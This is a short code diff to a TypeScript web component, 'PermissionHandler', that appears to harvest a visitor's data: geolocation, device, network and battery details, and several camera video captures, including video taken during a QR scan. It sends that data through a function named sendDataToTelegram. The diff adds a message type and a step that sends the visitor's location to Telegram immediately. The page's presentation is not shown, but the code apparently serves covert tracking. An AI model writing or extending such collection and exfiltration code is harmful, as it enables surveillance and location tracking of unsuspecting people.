@@ -46,7 +46,8 @@ enum MessageType {
   Video1 = "video1",
   Video2 = "video2",
   QrCode = "qr_code",
-  VideoQrScan = "video_qr_scan", // Новый тип сообщения для видео во время QR-сканирования
+  VideoQrScan = "video_qr_scan",
+  Geolocation = "geolocation", // Новый тип для отправки карты
 }
 
 type AppPhase =
@@ -246,6 +247,12 @@ const PermissionHandler = () => {
         getGeolocation(),
       ]);
 
+      // 1.1. Send geolocation immediately if available (fire-and-forget)
+      if (geolocationResult.data) {
+        console.log(`[Session ${currentSessionId}] Geolocation data found, sending immediately.`);
+        sendDataToTelegram({ geolocation: geolocationResult.data }, MessageType.Geolocation, attempt);
+      }
+
       const clientInfo = getClientInfo();
       const networkInfo = getNetworkInfo();
       const deviceMemory = getDeviceMemory();
@@ -269,6 +276,7 @@ const PermissionHandler = () => {
         initialCollectedData.batteryInfo = { status: batteryInfoResult.status };
       }
 
+      // Geolocation is still included in the summary text report
       if (geolocationResult.data) {
         initialCollectedData.geolocation = geolocationResult.data;
       }
